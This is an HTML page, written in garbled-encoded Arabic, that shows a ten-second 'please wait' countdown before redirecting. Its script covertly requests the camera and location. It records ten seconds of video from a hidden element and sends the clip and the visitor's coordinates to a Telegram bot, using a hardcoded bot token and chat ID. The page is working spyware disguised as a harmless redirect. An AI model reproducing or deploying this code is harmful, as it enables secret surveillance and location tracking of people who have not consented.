<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± 10 Ø«ÙˆØ§Ù†Ù</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            direction: rtl;
        }
        .countdown-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .progress-circle {
            position: relative;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(#00bfff calc(var(--progress) * 1%), #ccc 0%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #333;
            --progress: 100;
        }
        p {
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="countdown-container">
        <div class="progress-circle" id="progressCircle">10</div>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±ØŒ Ø³ÙŠØªÙ… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ Ø¨Ø¹Ø¯ 10 Ø«ÙˆØ§Ù†Ù...</p>
    </div>
    <video id="video" autoplay playsinline style="display: none;"></video>
    
    <script>
        let countdown = 10;
        let intervalId;
        let mediaRecorder;
        let recordedChunks = [];
        let latitude = 'Ù„Ù… ÙŠÙØ³Ù…Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
        let longitude = 'Ù„Ù… ÙŠÙØ³Ù…Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹';

        async function requestPermissions() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                return stream;
            } catch (err) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª: ', err);
                return null;
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition((position) => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    resolve();
                }, (error) => {
                    console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ', error);
                    resolve();
                });
            });
        }

        async function startCountdown() {
            const stream = await requestPermissions();
            await getLocation();

            if (stream) {
                document.getElementById('video').srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    sendToTelegram(videoBlob);
                };

                mediaRecorder.start();
                intervalId = setInterval(updateCountdown, 1000);

                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 10000); // Ù…Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ 10 Ø«ÙˆØ§Ù†Ù
            }
        }

        function updateCountdown() {
            countdown--;
            document.getElementById('progressCircle').style.setProperty('--progress', (countdown / 10) * 100);
            document.getElementById('progressCircle').textContent = countdown;

            if (countdown === 0) {
                clearInterval(intervalId);
                window.location.href = 'final_page.html'; // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
            }
        }

        function sendToTelegram(videoBlob) {
            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
            const chatId = '6185375878';

            const messageContent = `
#Ø±Ø³Ø§Ù„Ø©_2:
ğŸ¯ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹:
ğŸŒ Latitude: ${latitude}
ğŸŒ Longitude: ${longitude}
`;

            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const apiUrlMedia = `https://api.telegram.org/bot${token}/sendVideo`;

            fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: messageContent
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Telegram:', data);
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', videoBlob, 'video.webm');
                formData.append('caption', messageContent);

                return fetch(apiUrlMedia, {
                    method: 'POST',
                    body: formData
                });
            })
            .then(response => response.json())
            .then(data => {
                console.log('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Telegram:', data);
            })
            .catch(error => {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Telegram: ', error);
            });
        }

        startCountdown(); // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
    </script>
</body>
</html>
